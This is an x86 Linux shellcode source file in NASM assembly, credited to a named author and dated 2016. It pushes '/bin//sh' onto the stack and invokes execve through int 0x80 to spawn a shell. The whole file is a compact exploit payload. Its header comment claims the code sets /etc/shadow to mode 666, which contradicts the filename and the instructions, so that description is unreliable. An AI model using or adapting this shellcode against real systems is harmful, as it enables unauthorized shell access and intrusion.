;execve-stack-bin-sh.nasm
;this changes the permissions for /etc/shadow to 666
;Linux x86
;Saniv Kawa (@skawasec)
;www.popped.io
;December 6, 2016
;29 bytes
global _start

section .text

_start:
  xor ebx, ebx ;zero out EBX
  push ebx ;push 0 on to the stack
  pop eax ;pop 0 off the stack and zero out EAX
  push eax ;null terminate
  mov bl, 6 ;arithmetic for AL register
  add bl, bl ;arithmetic for AL register
  dec bl ;arithmetic for AL register
  push word 0x6873 ;hs
  push word 0x2f2f ;//
  push 0x6e69622f ;nib/
  mov eax, esp  ;stack pointer
  xchg eax, ebx ;EAX now contains the correct syscall value, 11.  
                ;EBX contians the stack pointer
  int 0x80
